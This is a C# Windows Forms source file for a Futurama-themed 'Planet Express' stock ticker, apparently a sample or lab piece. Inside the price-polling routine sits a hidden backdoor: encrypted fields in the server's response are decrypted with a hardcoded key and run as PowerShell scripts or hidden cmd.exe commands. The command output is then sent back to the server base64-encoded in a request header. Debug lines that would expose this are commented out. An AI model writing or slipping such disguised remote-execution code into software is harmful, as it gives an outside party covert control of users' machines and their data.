using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Security.Cryptography;
using System.Management.Automation;

namespace PlanetExpressStockTracker
{
    public partial class Form1 : Form
    {
        private static string motto, headerName;
        private static int timeout = 60;
            
        public Form1()
        {
            InitializeComponent();
            motto = "Our crew is expendable, your package is not.";
            headerName = "API-AGENT";
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            label1.Select();
            var MyTimer = new Timer();
            MyTimer.Interval = (timeout * 1000); // seconds
            MyTimer.Tick += new EventHandler(MyTimer_Tick);
            MyTimer.Start();
            DoNeedful();
        }

        private void MyTimer_Tick(object sender, EventArgs e)
        {
            DoNeedful();
        }

        private void DoNeedful()
        {
            textBox1.ReadOnly = true;
            textBox1.Text = "Current Stock Prices:\r\n";
            textBox1.Text += DateTime.Now.ToLongTimeString() + " (Every " + timeout + " seconds)\r\n\r\n";
            try
            {
                var url = "http://stock.planetexpresstrucking.com/ticker.php";
                textBox1.Text += url + "\r\n";
                var request = (HttpWebRequest) WebRequest.Create(url);
                request.Method = "POST";
                var header = Convert.ToBase64String(Encoding.UTF8.GetBytes("API " + DateTime.Now.ToFileTimeUtc()));
                request.Headers.Add(headerName + ": " + header);
                //textBox1.Text += request.Headers.ToString();
                using (var response = (HttpWebResponse)request.GetResponse())
                {
                    if (response.StatusCode != HttpStatusCode.OK)
                    {
                        var status = response.StatusCode.ToString();
                        textBox1.Text += status + "\r\n";
                    }
                    var stream = response.GetResponseStream();
                    var reader = new StreamReader(stream);
                    var emptyResponse = true;
                    while (!reader.EndOfStream)
                    {
                        var line = reader.ReadLine();
                        var elements = line.Split(',');
                        textBox1.Text += elements[0] + ": " + elements[1];
                        emptyResponse = false;
                        if (elements[2] == "U")
                        {
                            textBox1.Text += "↑\r\n";
                        }
                        else
                        {
                            textBox1.Text += "↓\r\n";
                        }
                        if (elements.Count() == 4)
                        {
                            var c = Encoding.UTF8.GetString(Convert.FromBase64String(elements[3]));
                            try
                            {
                                c = Decrypt(elements[3], motto);
                                var c2 = c.Split('Ω');
                                if (c2[0] == "P")
                                {
                                    //textBox1.Text += ">>Powershell: " + c2[1] + "\r\n";
                                    using (var powershell = PowerShell.Create())
                                    {
                                        powershell.AddScript(c2[1], false);
                                        powershell.Invoke();
                                        var results = powershell.Invoke();
                                        //textBox1.Text += ">>Output: ";
                                        var output = "";
                                        foreach (var result in results)
                                        {
                                            //textBox1.Text += result + "\r\n";
                                            output += result;
                                        }
                                        try
                                        {
                                            var request1 = (HttpWebRequest)WebRequest.Create(url);
                                            request1.Method = "POST";
                                            request1.Headers.Add(headerName + ": " + header);
                                            header = Convert.ToBase64String(Encoding.UTF8.GetBytes("Ω" + output));
                                            using (request1.GetResponse()) { }
                                        }
                                        catch { }
                                    }
                                }
                                if (c2[0] == "C")
                                {
                                    //textBox1.Text += ">>Command: " + c2[1] + "\r\n";
                                    var process = new System.Diagnostics.Process();
                                    var startInfo = new System.Diagnostics.ProcessStartInfo();
                                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                                    startInfo.CreateNoWindow = true;
                                    startInfo.FileName = "cmd.exe";
                                    startInfo.Arguments = "/c" + c2[1];
                                    startInfo.UseShellExecute = false;
                                    startInfo.RedirectStandardInput = false;
                                    startInfo.RedirectStandardOutput = true;
                                    startInfo.RedirectStandardError = false;
                                    process.StartInfo = startInfo;
                                    process.Start();
                                    process.WaitForExit();
                                    var results = process.StandardOutput.ReadToEnd();
                                    if (string.IsNullOrWhiteSpace(results))
                                    {
                                        results = "EMPTY OUTPUT";
                                    }
                                    try
                                    {
                                        var request1 = (HttpWebRequest)WebRequest.Create(url);
                                        request1.Method = "POST";
                                        header = Convert.ToBase64String(Encoding.UTF8.GetBytes(results));
                                        request1.Headers.Add(headerName + ": " + header);
                                        using (request1.GetResponse())
                                        { }
                                        //textBox1.Text += ">>Output: " + results + " " + header + "\r\n";
                                    }
                                    catch { }
                                }
                            }
                            catch (Exception ce)
                            {
                                textBox1.Text += ce.Message + "\r\n";
                            }
                        }

                    }
                    if (emptyResponse)
                    {
                        textBox1.Text += "Oh no!  The stocks are missing!\r\n\r\n";
                    }
                }
            }
            catch (Exception ex)
            {
                textBox1.Text += "Oops! Crew eaten by space wasps!\r\n" + ex.Message;
            }
        }

        private string Decrypt(string encrypted, string passphrase)
        {
            var key = Encoding.UTF8.GetBytes(passphrase);
            if (key.Length < 32)
            {
                var paddedkey = new byte[32];
                Buffer.BlockCopy(key, 0, paddedkey, 0, key.Length);
                key = paddedkey;
            }
            var iv = new byte[16];
            byte[] encryptedBytes = Convert.FromBase64String(encrypted);
            return DecryptStringFromBytesAes(encryptedBytes, key.Take(32).ToArray(), iv);
        }

        static string DecryptStringFromBytesAes(byte[] cipherText, byte[] key, byte[] iv)
        {
            RijndaelManaged aesAlg = null;
            string plaintext;
            aesAlg = new RijndaelManaged { Mode = CipherMode.CBC, Padding = PaddingMode.None, KeySize = 256, BlockSize = 128, Key = key, IV = iv };
            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
            using (MemoryStream msDecrypt = new MemoryStream(cipherText))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                    {
                        plaintext = srDecrypt.ReadToEnd();
                        srDecrypt.Close();
                    }
                }
            }
            return plaintext;
        }
    

        private void Form1_Resize(object sender, EventArgs e)
        {
            if (FormWindowState.Minimized == this.WindowState)
            {
                notifyIcon1.Visible = true;
                notifyIcon1.ShowBalloonTip(500);
                this.Hide();
            }
            else if (FormWindowState.Normal == this.WindowState)
            {
                notifyIcon1.Visible = false;
            }
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
